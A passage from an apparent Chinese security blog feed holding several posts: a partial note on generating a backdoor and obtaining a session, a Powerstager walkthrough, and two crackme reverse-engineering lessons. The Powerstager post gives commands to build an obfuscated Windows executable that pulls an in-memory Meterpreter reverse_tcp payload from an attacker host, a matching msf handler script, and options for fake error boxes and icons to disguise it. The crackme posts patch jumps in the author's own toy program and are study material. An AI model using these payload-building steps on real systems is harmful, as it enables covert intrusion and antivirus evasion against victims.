here"></p><p>4.添加版本-V 参数跟上随意指定版本信息以区分之前的包 <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1508041517597.jpg" alt="enter description here"></p><h2 id="生成并解压，得到会话"><a href="#生成并解压，得到会话" class="headerlink" title="生成并解压，得到会话"></a>生成并解压，得到会话</h2><p>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1508041977046.jpg" alt="enter description here"><br>&nbsp;<br>生成了backdoor<img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1508042235136.jpg" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1508042297286.jpg" alt="enter description here"><br>&nbsp;</p><p>在此期间会开启虚拟终端（xterm）<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1508042427222.jpg" alt="enter description here"><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1508042205105.jpg" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1508042169268.jpg" alt="enter description here"><br>&nbsp;<br>这个是xterm<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1508042349332.jpg" alt="enter description here"></p><p>解压backdoor<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1508042528761.jpg" alt="enter description here"></p><p>并且得到会话<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1508037428945.jpg" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> Metasploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Powerstager | Msf | kali linux 2017</title>
      <link href="/Powerstager.html"/>
      <url>/Powerstager.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/284B54C9000962D18FBCC596F03CF3B4.jpg" alt="enter description here"></p><span id="more"></span><p>github: <a href="https://github.com/z0noxz/powerstager">https://github.com/z0noxz/powerstager</a><br>youtube :<a href="https://youtu.be/R_Xz_sGhHck">https://youtu.be/R_Xz_sGhHck</a></p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/poststager.mp4'    frameborder="0"     allowfullscreen></iframe><p>不合理使用此脚本所提供的功能而造成的任何直接或者间接的后果及损失， 均由使用者本人负责，即刻安全以及创作者不为此承担任何责任。 </p><pre>该脚本创建一个exe文件，可以下载所选的PowerShell有效内容，将其加载到内存中，并使用模糊的EC方法执行它。脚本还将加密动态签名和一些额外的模糊处理。这使得实际有效载荷可以间接执行，而不用受害者下载它，只能通过执行寄存器。攻击者可以例如在网络服务器上实现逃避技术，托管有效载荷，而不是在破坏者本身。额外的方法允许将有效载荷嵌入到“stager”中并临时存储在磁盘上以进行内存注入。管理Windows时不仅功能强大，而且在利用Windows时也很强大。这个脚本利用了多个Windows功能，如其继承的powerhell的信任，速记语法的解释，代码评估等等...</pre><p>安装过程</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/z0noxz/powerstager</span><br><span class="line">cd powerstager</span><br><span class="line">apt-get install python3</span><br><span class="line">apt-get install mingw-w64</span><br><span class="line">pip install names</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1507371742082.jpg" alt="enter description here"></p><h2 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h2><p>这里使用Python3 来运行脚本，否则会出错。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1507372806653.jpg" alt="enter description here"></p><h2 id="简单编译"><a href="#简单编译" class="headerlink" title="简单编译"></a>简单编译</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1507372909535.jpg" alt="enter description here"></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 powerstager.py -m -t win64 --lhost=192.168.1.103 --lport=4444 -o /root/demon.exe</span><br></pre></td></tr></table></figure><p>这里用到的参数可以在帮助参数能找的到，我这里简单的介绍下，这一简短的命令<br>-m 参数 这里默认的使用的是msf的中 windows&#x2F;meterperter&#x2F;reverse_tcp 的payload</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1507373369624.jpg" alt="enter description here"></p><p> -t 参数代码的是windows的架构平台 可使用跟上 win64 &#x2F;win32<br> <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1507373537360.jpg" alt="enter description here"></p><p>剩下的参数我就不用多说了 LHOST LPORT 指的是攻击者IP 和端口，以及-o 代表的输出路径</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1507373617093.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1507373649370.jpg" alt="enter description here"></p><h2 id="开启MSF并到目标机运行"><a href="#开启MSF并到目标机运行" class="headerlink" title="开启MSF并到目标机运行"></a>开启MSF并到目标机运行</h2><p>我这里简单的写了rc脚本，使用msf 去加载这脚本，下次使用它就改IP 和端口就可以了<br>并给它命名为</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1507374844089.jpg" alt="enter description here"></p><p>使用msfconsole -r  加载这个脚本</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1507374118363.jpg" alt="enter description here"></p><p>自动的帮我们加载我们设置好的msf的设置</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1507374936238.jpg" alt="enter description here"></p><p>得到会话</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1507375081136.jpg" alt="enter description here"></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD windows/x64/meterpreter/reverse<span class="emphasis">_tcp</span></span><br><span class="line"><span class="emphasis">set LHOST 192.168.1.103</span></span><br><span class="line"><span class="emphasis">run</span></span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1507375067338.jpg" alt="enter description here"></p><h2 id="其他选项"><a href="#其他选项" class="headerlink" title="其他选项"></a>其他选项</h2><p>其他选项 作者给我们提供了比较有意思的选项 一个是给exe增加图标，另一个是增加错误框的信息<br>–obfuscation  添加代码混淆<br>–fake-error&#x3D;”T::C”  添加弹框（填写一些错误弹框信息）<br>–icon  添加程序图标 (后面跟上图标路径)<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1507376095417.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1507376415707.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1507376396495.jpg" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> Metasploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>登录暴力破解 | 逆向笔记(二)</title>
      <link href="/reverse2.html"/>
      <url>/reverse2.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/C2DB3778361E459A07A63F2E4AE6F952.jpg" alt="enter description here"></p><span id="more"></span><p>接着上一篇的总结，ONDragon的第二课。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">#define  <span class="emphasis">_CRT_</span>SECURE<span class="emphasis">_NO_</span>WARNINGS</span></span><br><span class="line"><span class="section">#include <span class="language-xml"><span class="tag">&lt;<span class="name">windows.h</span>&gt;</span></span></span></span><br><span class="line"><span class="section">#include <span class="language-xml"><span class="tag">&lt;<span class="name">stdio.h</span>&gt;</span></span></span></span><br><span class="line"><span class="section">#include &quot;resource.h&quot;</span></span><br><span class="line">char name[1024] = &quot;ONDragon&quot;;  //设置用户名、密码</span><br><span class="line">char pass[1024] = &quot;666&quot;;</span><br><span class="line">BOOL check(char  userName[], char  passWord[])  //检测判断用户名和密码是否和设置一样</span><br><span class="line">&#123;</span><br><span class="line"><span class="code">if (userName == NULL || passWord == NULL)</span></span><br><span class="line"><span class="code">&#123;</span></span><br><span class="line"><span class="code">return FALSE;</span></span><br><span class="line"><span class="code">&#125;</span></span><br><span class="line"><span class="code">else</span></span><br><span class="line"><span class="code">&#123;</span></span><br><span class="line"><span class="code">if (*userName == *name)</span></span><br><span class="line"><span class="code">&#123;</span></span><br><span class="line"><span class="code">if (*passWord == *pass)</span></span><br><span class="line"><span class="code">&#123;</span></span><br><span class="line"><span class="code">return TRUE;</span></span><br><span class="line"><span class="code">&#125;</span></span><br><span class="line"><span class="code">else</span></span><br><span class="line"><span class="code">&#123;</span></span><br><span class="line"><span class="code">return FALSE;</span></span><br><span class="line"><span class="code">&#125;</span></span><br><span class="line"><span class="code">&#125;</span></span><br><span class="line"><span class="code">else</span></span><br><span class="line"><span class="code">&#123;</span></span><br><span class="line"><span class="code">return FALSE;</span></span><br><span class="line"><span class="code">&#125;</span></span><br><span class="line"><span class="code">&#125;</span></span><br><span class="line"><span class="code">&#125;</span></span><br><span class="line"><span class="code">BOOL CALLBACK MainDlgProc(HWND hDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)</span></span><br><span class="line"><span class="code">&#123;</span></span><br><span class="line"><span class="code">BOOL bRet = FALSE;</span></span><br><span class="line"><span class="code">switch (uMsg)</span></span><br><span class="line"><span class="code">&#123;</span></span><br><span class="line"><span class="code">case WM_CLOSE:</span></span><br><span class="line"><span class="code">&#123;</span></span><br><span class="line"><span class="code">EndDialog(hDlg, 0);</span></span><br><span class="line"><span class="code">break;</span></span><br><span class="line"><span class="code">&#125;</span></span><br><span class="line"><span class="code">case WM_INITDIALOG:</span></span><br><span class="line"><span class="code">&#123;</span></span><br><span class="line"><span class="code">SetWindowPos(hDlg, HWND_NOTOPMOST, 400, 300, 410, 180, SWP_SHOWWINDOW);</span></span><br><span class="line"><span class="code">break;</span></span><br><span class="line"><span class="code">&#125;</span></span><br><span class="line"><span class="code">case WM_COMMAND:</span></span><br><span class="line"><span class="code">switch (LOWORD(wParam))</span></span><br><span class="line"><span class="code">&#123;</span></span><br><span class="line"><span class="code">case IDC_BUTTON_LOGIN:</span></span><br><span class="line"><span class="code">&#123;</span></span><br><span class="line"><span class="code">char userName[1024];</span></span><br><span class="line"><span class="code">char passWord[1024];</span></span><br><span class="line"><span class="code">GetDlgItemText(hDlg, IDC_EDIT_USER, userName, 1024);  </span></span><br><span class="line"><span class="code">GetDlgItemText(hDlg, IDC_EDIT_PASS, passWord, 1024);</span></span><br><span class="line"><span class="code">if (check(userName,passWord))</span></span><br><span class="line"><span class="code">&#123;</span></span><br><span class="line"><span class="code">MessageBox(hDlg, &quot;Login Successful&quot;, &quot;Congratulation&quot;, MB_OK); //登录成功</span></span><br><span class="line"><span class="code">&#125;</span></span><br><span class="line"><span class="code">else</span></span><br><span class="line"><span class="code">&#123;</span></span><br><span class="line"><span class="code">MessageBox(hDlg, &quot;Login Failed&quot;, &quot;Sorry&quot;, MB_OK); //登录失败</span></span><br><span class="line"><span class="code">&#125;</span></span><br><span class="line"><span class="code">return TRUE;</span></span><br><span class="line"><span class="code">&#125;</span></span><br><span class="line"><span class="code"></span></span><br><span class="line"><span class="code">&#125;</span></span><br><span class="line"><span class="code">break;</span></span><br><span class="line"><span class="code">&#125;</span></span><br><span class="line"><span class="code"></span></span><br><span class="line"><span class="code">return bRet;</span></span><br><span class="line"><span class="code">&#125;</span></span><br><span class="line"><span class="code">int APIENTRY WinMain(HINSTANCE hInstance,</span></span><br><span class="line"><span class="code">HINSTANCE hPrevInstance,</span></span><br><span class="line"><span class="code">LPSTR     lpCmdLine,</span></span><br><span class="line"><span class="code">int       nCmdShow)</span></span><br><span class="line"><span class="code">&#123;</span></span><br><span class="line"><span class="code">DialogBox(hInstance, MAKEINTRESOURCE(IDD_DIALOG_MAIN), NULL, MainDlgProc);</span></span><br><span class="line"><span class="code">return 0;</span></span><br><span class="line"><span class="code">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="这次依旧是登录小程序"><a href="#这次依旧是登录小程序" class="headerlink" title="这次依旧是登录小程序"></a>这次依旧是登录小程序</h2><p>本次编译的是  release版本</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506956269052.jpg" alt="enter description here"></p><p>未破解的<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506956476486.jpg" alt="enter description here"></p><p>破解后的<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506956434705.jpg" alt="enter description here"></p><h2 id="载入Ollydebug"><a href="#载入Ollydebug" class="headerlink" title="载入Ollydebug"></a>载入Ollydebug</h2><p>这里我们载入OD</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506956756044.jpg" alt="enter description here"></p><p>和上篇一样，我这里依旧使用的是查找字符串<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506956995124.jpg" alt="enter description here"></p><p>在这里只能短短的看到 登录失败和登录成功几个字，我们双击其中一个字符串，进行跟踪</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506956890222.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506957521671.jpg" alt="enter description here"></p><p>我们来简单看下。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506957984283.jpg" alt="enter description here"></p><h2 id="1-简单思考与分析"><a href="#1-简单思考与分析" class="headerlink" title="1. 简单思考与分析"></a>1. 简单思考与分析</h2><p>这两条指令 （cmp）将 ss:[ebp-0x404]的值和0x4F做比较，两个值相减为0，（ZF ，零标志，标明结果为0。真置1，假置0。）</p><p>反汇编窗口</p><p>这里也就是将第一个字节 与4F 做判断是否非为0。第一个cmp指的是用户名的字符串</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506958160790.jpg" alt="enter description here"></p><p>那么这里我们不能让下条指令跳转到，登录失败。 第二个cmp指的是密码的字符串</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506963545170.jpg" alt="enter description here"></p><p>这里同样也是将第一个字节 与4F 做判断是否非为0。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506960581227.jpg" alt="enter description here"></p><p>寄存器窗口<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506960591504.jpg" alt="enter description here"></p><h2 id="2-修改"><a href="#2-修改" class="headerlink" title="2.修改"></a>2.修改</h2><p>我们如何不能让他跳转到登录失败呢<br>这里我们下个断点，在第一个cmp处。也就是判断用户名是否正确的地方。(按F2设置断点)</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506964051036.jpg" alt="enter description here"></p><p>并且运行程序<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506964113386.jpg" alt="enter description here"></p><p>键入用户名和密码后，已断在断点处。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506964176532.jpg" alt="enter description here"></p><p>选中第一个cmp处，查看内存地址对应键入用户名的字符串 （右键-&gt;数据窗口中跟随-&gt;内存地址）</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506964255750.jpg" alt="enter description here"></p><p>我们在数据窗口中可以看到，我们键入的用户名为demon ，第一个字节d 对应的则为64 十六进制 （在ASCLL码表即可找到相应的，其他依次类推）由于在cmp 设置的为bype 一个字节，后门判断 4F也为一个字节，cmp需将其判断为0，则我们也可以将其cmp处的代码 中的0x4F，改为0x64</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506964421167.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506964776844.jpg" alt="enter description here"></p><p>或将数据窗口的 64 改成4F即可。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506964830092.jpg" alt="enter description here"></p><p>第二处 cmp以此类推。<br>修改完两处之后，我们运行看看，可以成功得到login successful 的弹窗！</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506998071787.jpg" alt="enter description here"></p><h2 id="3-NOP大法"><a href="#3-NOP大法" class="headerlink" title="3.NOP大法"></a>3.NOP大法</h2><p>还有另一种修改方案则是NOP大法。<br>在cmp处下断点，并将两处cmp 将其NOP掉。<br>双击CMP 汇编代码 ，将其代码填写为nop</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506998307857.jpg" alt="enter description here"><br>填充nop<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506998323149.jpg" alt="enter description here"></p><p>nop后<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506999423856.jpg" alt="enter description here"></p><p>运行后,一样提示得到login successful 的弹窗！</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506999489213.jpg" alt="enter description here"><br>&nbsp;</p><h2 id="4-修改跳转指令"><a href="#4-修改跳转指令" class="headerlink" title="4.修改跳转指令"></a>4.修改跳转指令</h2><p>先上几张跳转指令基础知识图</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/585205_1rlcvcln6xhqiib.png" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/585205_wpjlvo9kl61tvyq.png" alt="enter description here"></p><p>今天就先看这几个跳转指令，与ZF标志位相关</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1507000225793.jpg" alt="enter description here"></p><p>这里我们依旧还是在cmp处下断点，并运行，执行到断点处</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1507000444071.jpg" alt="enter description here"></p><p>两处jnz 改为 jz 或者je （改成jz 或自动填写je）<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1507002904856.jpg" alt="enter description here"></p><p>以下是debug版本的IDA载入图，破解方法和之前的类似，这里就不再重复多说了，工具和课程视频咋即刻安全网盘即可下载。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/87CD7E8A-4ABB-4015-95D2-8094BF6A8C50.png" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>登录暴力破解 | 逆向笔记(一)</title>
      <link href="/reverse.html"/>
      <url>/reverse.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/reverse-engineering-with-radare2-quick-introduction.1280x600.jpg" alt="enter description here"></p><span id="more"></span><p>前阵子ONDragon之前在群中了做了一个公开课，我觉得蛮受用的。决定和各位分享下，自己的过程，同时也是给我自己做个笔记。</p><h2 id="1-源代码"><a href="#1-源代码" class="headerlink" title="1.源代码"></a>1.源代码</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">#include <span class="language-xml"><span class="tag">&lt;<span class="name">stdio.h</span>&gt;</span></span></span></span><br><span class="line"><span class="section">#include <span class="language-xml"><span class="tag">&lt;<span class="name">windows.h</span>&gt;</span></span></span></span><br><span class="line"><span class="section">#include <span class="language-xml"><span class="tag">&lt;<span class="name">stdio.h</span>&gt;</span></span></span></span><br><span class="line"><span class="section">#include <span class="language-xml"><span class="tag">&lt;<span class="name">iostream</span>&gt;</span></span></span></span><br><span class="line">using namespace std;</span><br><span class="line">string userName(&quot;ONDragon&quot;), passWord(&quot;666&quot;);   \\设定用户名密码</span><br><span class="line"><span class="section">#define  Log(str) &#123;&#123;printf(&quot;[Log] =&gt; %s\n&quot;,str);&#125;&#125;</span></span><br><span class="line">BOOL check(string name, string pass)</span><br><span class="line">&#123;</span><br><span class="line"><span class="code">if ( name.empty() || pass.empty() )</span></span><br><span class="line"><span class="code">&#123;</span></span><br><span class="line"><span class="code">return FALSE;</span></span><br><span class="line"><span class="code">&#125;</span></span><br><span class="line"><span class="code">if (name == userName &amp;&amp; pass ==passWord)   \\判断用户名和密码是否正确，逻辑判断</span></span><br><span class="line"><span class="code">&#123;</span></span><br><span class="line"><span class="code"> return TRUE;</span></span><br><span class="line"><span class="code">&#125; </span></span><br><span class="line"><span class="code">else</span></span><br><span class="line"><span class="code">&#123;</span></span><br><span class="line"><span class="code">return FALSE;</span></span><br><span class="line"><span class="code">&#125;</span></span><br><span class="line"><span class="code">&#125;</span></span><br><span class="line"><span class="code">int main()</span></span><br><span class="line"><span class="code">&#123;</span></span><br><span class="line"><span class="code">Log(&quot;Begain Main&quot;);   </span></span><br><span class="line"><span class="code">char name[100];   \\定义用户名和密码是char类型</span></span><br><span class="line"><span class="code">char pass[100];</span></span><br><span class="line"><span class="code">while (TRUE)</span></span><br><span class="line"><span class="code">&#123;</span></span><br><span class="line"><span class="code">cout &lt;&lt; &quot;Please input your userName :&quot; &lt;&lt; endl;     \\输入用户名和密码</span></span><br><span class="line"><span class="code">cin &gt;&gt; name;</span></span><br><span class="line"><span class="code">cout &lt;&lt; &quot;Please input your passWord :&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="code">cin &gt;&gt; pass;</span></span><br><span class="line"><span class="code">if (check(string(name), string(pass)))    \\关键函数check</span></span><br><span class="line"><span class="code">  &#123;</span></span><br><span class="line"><span class="code">Log(&quot;Login Successful&quot;);   \\登录成功</span></span><br><span class="line"><span class="code">Sleep(5000);</span></span><br><span class="line"><span class="code">return 1;</span></span><br><span class="line"><span class="code">&#125;</span></span><br><span class="line"><span class="code">else</span></span><br><span class="line"><span class="code">&#123;</span></span><br><span class="line"><span class="code">Log(&quot;Login Failed&quot;);    \\否则失败就会循环重复输入用户名密码</span></span><br><span class="line"><span class="code">&#125;</span></span><br><span class="line"><span class="code">&#125;</span></span><br><span class="line"><span class="code">Log(&quot;End Main&quot;);</span></span><br><span class="line"><span class="code">return 0;</span></span><br><span class="line"><span class="code">&#125;</span></span><br></pre></td></tr></table></figure><p>&nbsp;</p><h2 id="2-编译运行"><a href="#2-编译运行" class="headerlink" title="2.编译运行"></a>2.编译运行</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@demon:~# ls</span><br><span class="line">  FirstClass.cpp</span><br><span class="line">root@demon:~# i586-mingw32msvc-g++  -o secist.exe FirstClass.cpp</span><br><span class="line">FirstClass.cpp:61:2: warning: no newline at end of file</span><br><span class="line">root@demon:~# wine secist</span><br><span class="line">[Log] =&gt; Begain Main</span><br><span class="line">Please input your userName :</span><br><span class="line">1123</span><br><span class="line">Please input your passWord :</span><br><span class="line">123</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/93FEF6CF-4A88-42B7-B0C8-8101C40FC874.png" alt="enter description here"></p><p>因为本机是OSX 懒得用windows下编译，我这里直接用mingw32 编译，用wine运行，结果是输错账户密码，循环让用户输入，直到正确的用户名和密码。<br>&nbsp;</p><h2 id="3-载入IDA"><a href="#3-载入IDA" class="headerlink" title="3.载入IDA"></a>3.载入IDA</h2><p>将secist.exe 拖入IDA查看下流程图，看下程序是如何运行</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/3C7D5B10-E2AC-4C0B-BE96-E4ABBCDF5668.png" alt="enter description here"></p><p>这里我们需要将他跳到</p><p>这里很明显可以看到，从程序入口点到键入用户名和密码，是如何循环的<br>1.JNZ : jump if not zero 结果不为零则转移，单标志条件转移，当ZF＝0时转移。<br>2.我们这里需要将它跳转到不为0，也就是z标志位为1<br>&nbsp;</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/E666E83C-DBAC-4691-BDD3-7DAC94862F37.png" alt="enter description here"></p><h2 id="4-载入Ollydebug"><a href="#4-载入Ollydebug" class="headerlink" title="4.载入Ollydebug"></a>4.载入Ollydebug</h2><p>接下来我们将程序载入OD 看看。前面我们已经知道程序的整个流程了，我们需要找到jmp的关键处</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506776242908.jpg" alt="enter description here"><br>&nbsp;<br>我们在反汇编窗口，右键，使用字符串搜索功能，搜索关键处。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506776432739.jpg" alt="enter description here"><br>&nbsp;<br>在搜索处，我们可以看到熟悉的字符串<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/A4B2650B-09C8-4607-AC51-8118BA467431.png" alt="enter description here"><br>&nbsp;<br>这里我们可以找<font color="##006000">Login successful </font> ,我们这里双击跟进跟踪，我们找到Login successful相关的汇编代码，在往上看我们可以看到，我们之前在IDA看到的 <font color="##006000">jnz </font> 汇编跳转指令。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/A688CA17-21BB-436F-A099-BE97E4E723DB.png" alt="enter description here"></p><p>我们这里可以使用几种方法。<br>判断后如果不跳，就会到下一个jmp，jmp是无条件跳,既然错误的话，jnz会跳到错误信息,那么我们输入错误后，jz就肯定不跳. (Akkuman师傅教了我也很多)</p><h2 id="修改Z标志位。"><a href="#修改Z标志位。" class="headerlink" title="修改Z标志位。"></a>修改Z标志位。</h2><p>我们来看看 jnz ，也就说jmp not zero（跳转不是0的地方） 现在z标志位为1，需要将其修改为 0.即可实现输入错误信息，就跳转到成功登陆。</p><p>1.我们在 jnz 处下个断点。（断点快捷点F2）<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506778553462.jpg" alt="enter description here"><br>&nbsp;<br>2.我们将其程序运行，输出错误的用户名和密码，断点处，自动断下。<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506778655119.jpg" alt="enter description here"><br>&nbsp;<br>这里我们可以看到Z标注处为1<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506779013665.jpg" alt="enter description here"><br>&nbsp;<br>我们将其z标志位 双击 修改成1<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/CDF92339-9DB7-4E30-9755-8C074FCA19C6.png" alt="enter description here"><br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1506780080102.jpg" alt="enter description here"><br>&nbsp;<br> 我们将其程序运行，显示登录成功<br> &nbsp;<br><img 